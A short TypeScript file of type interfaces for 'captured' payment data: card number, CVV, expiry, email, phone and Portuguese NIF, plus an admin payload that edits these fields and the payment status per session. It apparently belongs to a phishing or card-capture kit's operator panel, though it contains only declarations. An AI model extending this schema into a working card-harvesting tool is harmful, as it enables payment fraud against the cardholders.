
export interface CapturedData {
  cardNumber: string;
  cardHolder: string;
  expiryDate: string;
  cvv: string;
  email: string;
  phone: string;
  nif: string;
  paymentMethod: string;
  paymentStatus: 'idle' | 'processing' | 'approved' | 'denied';
}

export interface AdminUpdatePayload {
  sessionId: string;
  field: keyof CapturedData;
  value: string;
}

export interface SessionData extends CapturedData {
  timestamp: string;
}
